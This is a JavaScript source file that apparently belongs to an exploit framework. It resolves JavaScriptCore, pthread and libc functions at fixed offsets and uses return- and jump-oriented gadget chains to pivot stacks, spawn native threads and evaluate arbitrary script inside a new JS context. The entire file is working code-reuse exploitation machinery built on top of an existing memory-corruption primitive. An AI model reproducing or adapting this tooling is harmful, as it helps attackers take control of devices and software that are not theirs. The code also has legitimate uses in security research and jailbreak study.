"use strict";

//#region Contants
// used for js thread
var JSGlobalContextCreate = new NativeFunction(jsc_base.add(0x4990), "bigint");
var JSGlobalContextRelease = new NativeFunction(jsc_base.add(0x4CA0), "bigint");
var JSContextGetGlobalObject = new NativeFunction(jsc_base.add(0x4D60), "bigint");
var JSObjectSetProperty = new NativeFunction(jsc_base.add(0x7970), "bigint");
var JSStringCreateWithUTF8CString = new NativeFunction(jsc_base.add(0xC710), "bigint");
var JSEvaluateScript = new NativeFunction(jsc_base.add(0xB90), "bigint");
var JSValueToStringCopy = new NativeFunction(jsc_base.add(0xE530), "bigint");
var JSStringGetMaximumUTF8CStringSize = new NativeFunction(jsc_base.add(0xCA40), "bigint");
var JSStringGetUTF8CString = new NativeFunction(jsc_base.add(0xCA60), "bigint");
var JSStringRelease = new NativeFunction(jsc_base.add(0xC9D0), "bigint");
var JSValueMakeString = new NativeFunction(jsc_base.add(0xDD50), "bigint");

// used for threading
var pthread_attr_destroy = new NativeFunction(jsc_base.add(0x270), "bigint");
var pthread_attr_get_np = new NativeFunction(jsc_base.add(0x280), "bigint");
var pthread_attr_getstack = new NativeFunction(jsc_base.add(0x290), "bigint");
var pthread_attr_init = new NativeFunction(jsc_base.add(0x2A0), "bigint");
var pthread_self = new NativeFunction(jsc_base.add(0x2D0), "bigint");
var pthread_attr_setstacksize = new NativeFunction(jsc_base.add(0x850), "bigint");
var pthread_cond_broadcast = new NativeFunction(jsc_base.add(0x860), "bigint");
var pthread_cond_destroy = new NativeFunction(jsc_base.add(0x870), "bigint");
var pthread_cond_init = new NativeFunction(jsc_base.add(0x880), "bigint");
var pthread_cond_signal = new NativeFunction(jsc_base.add(0x890), "bigint");
var pthread_cond_wait = new NativeFunction(jsc_base.add(0x8B0), "bigint");
var pthread_create = new NativeFunction(jsc_base.add(0x8C0), "bigint");
var pthread_detach = new NativeFunction(jsc_base.add(0x8D0), "bigint");
var pthread_join = new NativeFunction(jsc_base.add(0x8F0), "bigint");
var pthread_mutex_destroy = new NativeFunction(jsc_base.add(0x900), "bigint");
var pthread_mutex_init = new NativeFunction(jsc_base.add(0x910), "bigint");
var pthread_mutex_lock = new NativeFunction(jsc_base.add(0x920), "bigint");
var pthread_mutex_unlock = new NativeFunction(jsc_base.add(0x940), "bigint");

// used for allocs
var malloc = new NativeFunction(libc_base.add(0x55BE0), "bigint");
var free = new NativeFunction(libc_base.add(0x55BF0));
//#endregion
//#region Classes
class Thread {
  constructor(stack_size, name) {
    this.name = name;
    this.running = false;
    this.stack_size = stack_size
    this.mutex_addr = alloc(8);
    this.cond_addr = alloc(8);
    this.attr_addr = alloc(8);
    this.pivot_frame = new Frame(["rsp"]);
    this.pivot_stack = new Stack(0x1000);
    this.pivot_pivot = new Pivot();

    this.pivot_insts = [];
    this.pivot_insts.push(gadgets.PUSH_RBP_POP_RCX_RET);
    this.pivot_insts.push(gadgets.MOV_RAX_RCX_RET);
    this.pivot_frame.store(this.pivot_insts, "rsp");

    pthread_mutex_lock.chain(this.pivot_insts, this.mutex_addr);
    pthread_cond_wait.chain(this.pivot_insts, this.cond_addr, this.mutex_addr);
    pthread_mutex_unlock.chain(this.pivot_insts, this.mutex_addr);

    this.pivot_frame.load(this.pivot_insts, "rsp");
    this.pivot_insts.push(gadgets.PUSH_RAX_POP_RBP_RET);
    this.pivot_insts.push(gadgets.POP_RAX_RET);
    this.pivot_insts.push(0);
    this.pivot_insts.push(gadgets.LEAVE_RET);
  };

  resume() {
    if (pthread_mutex_lock.invoke(this.mutex_addr).neq(0)) {
      throw new Error(`Unable to lock mutex ${this.mutex_addr} !!`);
    }

    if (pthread_cond_signal.invoke(this.cond_addr).neq(0)) {
      throw new Error(`Unable to signal cond ${this.ctx.cond} !!`);
    }

    if (pthread_mutex_unlock.invoke(this.mutex_addr).neq(0)) {
      throw new Error(`Unable to unlock mutex ${this.mutex_addr} !!`);
    }
  }

  join() {
    if (pthread_join.invoke(this.pthread_addr, 0).neq(0)) {
      throw new Error(`Unable to join thread ${this.name} !!`);
    }

    this.running = false;

    this.pivot_frame.reset();
    this.pivot_stack.reset();

    if (pthread_mutex_destroy.invoke(this.mutex_addr).neq(0)) {
      throw new Error(`Unable to destroy mutex ${this.mutex_addr} !!`);
    }

    if (pthread_cond_destroy.invoke(this.cond_addr).neq(0)) {
      throw new Error(`Unable to destroy cond ${this.cond_addr} !!`);
    }

    if (pthread_attr_destroy.invoke(this.attr_addr).neq(0)) {
      throw new Error(`Unable to destroy attr ${this.attr_addr} !!`);
    }
  }

  inject(stack) {
    var current_sp = this.pthread_stack_addr.add(this.pthread_stack_size.sub(0x40));
    var copy_size = stack.size - stack.sp;
    var new_sp = current_sp.sub(copy_size);

    copy(new_sp, stack.addr.add(stack.sp), copy_size);

    this.pivot_frame.set_value("rsp", new_sp);
  }

  spawn() {
    if (this.running) {
      log(`Thread ${this.name} already running !!`);
      return;
    }

    if (pthread_mutex_init.invoke(this.mutex_addr, 0).neq(0)) {
      throw new Error("Unable to create mutex !!");
    }

    if (pthread_cond_init.invoke(this.cond_addr, 0).neq(0)) {
      throw new Error("Unable to create cond !!");
    }

    if (pthread_attr_init.invoke(this.attr_addr).neq(0)) {
      throw new Error("Unable to create attr !!");
    }

    if (pthread_attr_setstacksize.invoke(this.attr_addr, this.stack_size).neq(0)) {
      throw new Error("Unable to set stack size !!");
    }

    this.pivot_stack.prepare(this.pivot_insts, this.pivot_frame);
    this.pivot_pivot.prepare(this.pivot_stack);

    var pthread_addr_addr = alloc(8);

    if (pthread_create.invoke(pthread_addr_addr, this.attr_addr, gadgets.MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18, this.pivot_pivot.jop_store_addr).neq(0)) {
      throw new Error(`Unable to create thread ${this.name} !!`);
    }

    this.pthread_addr = view(pthread_addr_addr).getBigInt(0, true);
    this.pthread_id = view(this.pthread_addr).getBigInt(0, true);

    dispose(pthread_addr_addr);

    var stack_addr_addr = alloc(8);
    var stack_size_addr = alloc(8);

    if (pthread_attr_get_np.invoke(this.pthread_addr, this.attr_addr).neq(0)) {
      throw new Error(`Unable to get attr from thread ${this.pthread_id} !!`);
    }

    if (pthread_attr_getstack.invoke(this.attr_addr, stack_addr_addr, stack_size_addr).neq(0)) {
      throw new Error(`Unable to get stack from thread ${this.pthread_id} !!`);
    }

    this.pthread_stack_addr = view(stack_addr_addr).getBigInt(0, true);
    this.pthread_stack_size = view(stack_size_addr).getBigInt(0, true);

    dispose(stack_addr_addr);
    dispose(stack_size_addr);

    this.running = true;
  }
};

class JSThread {
  constructor(name, script) {
    this.script = script;
    this.thread = new Thread(0x200000, name);
    this.js_frame = new Frame(["script_cstr", "ctx", "script", "exception", "ret", "exception_str", "ret_str", "exception_str_size", "ret_str_size", "exception_cstr", "ret_cstr"]);
    this.js_stack = new Stack(0x1000);

    this.js_insts = [];
    this.js_insts.push(0);
    this.js_insts.push(gadgets.RET); // alignment for xmm/ymm
    JSGlobalContextCreate.chain(this.js_insts, 0);
    this.js_frame.store(this.js_insts, "ctx");

    this.js_insts.push(gadgets.RET); // alignment for xmm/ymm
    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "script_cstr");
    this.js_insts.push(JSStringCreateWithUTF8CString.addr);
    this.js_frame.store(this.js_insts, "script");
    
    this.js_insts.push(gadgets.POP_R9_JO_RET);
    this.js_insts.push(this.js_frame.addrof("exception"));
    this.js_insts.push(gadgets.POP_R8_RET);
    this.js_insts.push(0);
    this.js_insts.push(gadgets.POP_RCX_RET);
    this.js_insts.push(0);
    this.js_insts.push(gadgets.POP_RDX_RET);
    this.js_insts.push(0);
    this.js_frame.pop(this.js_insts, gadgets.POP_RSI_RET, "script");
    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "ctx");
    this.js_insts.push(JSEvaluateScript.addr);
    this.js_frame.store(this.js_insts, "ret");

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "script");
    this.js_insts.push(JSStringRelease.addr);

    // return and exception strings
    for (var name of ["exception", "ret"]) {
      this.js_insts.push(gadgets.POP_RDX_RET);
      this.js_insts.push(0);
      this.js_frame.pop(this.js_insts, gadgets.POP_RSI_RET, name);
      this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "ctx");
      this.js_insts.push(JSValueToStringCopy.addr);
      this.js_frame.store(this.js_insts, `${name}_str`);
    
      this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, `${name}_str`);
      this.js_insts.push(JSStringGetMaximumUTF8CStringSize.addr);
      this.js_frame.store(this.js_insts, `${name}_str_size`);
    
      this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, `${name}_str_size`);
      this.js_insts.push(malloc.addr);
      this.js_frame.store(this.js_insts, `${name}_cstr`);
    
      this.js_frame.pop(this.js_insts, gadgets.POP_RDX_RET, `${name}_str_size`);
      this.js_frame.pop(this.js_insts, gadgets.POP_RSI_RET, `${name}_cstr`);
      this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, `${name}_str`);
      this.js_insts.push(JSStringGetUTF8CString.addr);
    
      this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, `${name}_str`);
      this.js_insts.push(JSStringRelease.addr);
    }

    this.js_frame.pop(this.js_insts, gadgets.POP_RDI_RET, "ctx");
    this.js_insts.push(JSGlobalContextRelease.addr);

    this.js_insts.push(gadgets.RET); // alignment for xmm/ymm
    this.js_insts.push(gadgets.POP_RBP_RET);
  };

  execute() {
    this.thread.spawn();

    this.js_frame.set_value("script_cstr", this.script.cstr());
    this.js_stack.prepare(this.js_insts, this.js_frame);

    this.thread.inject(this.js_stack);

    this.thread.resume();
  }

  join() {
    this.thread.join();
    
    var exception_cstr = this.js_frame.get_value("exception_cstr");
    var ret_cstr = this.js_frame.get_value("ret_cstr");

    this.exception = String.from(exception_cstr);
    this.ret = String.from(ret_cstr);

    free.invoke(exception_cstr);
    free.invoke(ret_cstr);

    this.js_frame.reset();
    this.js_stack.reset();
  }
};
//#endregion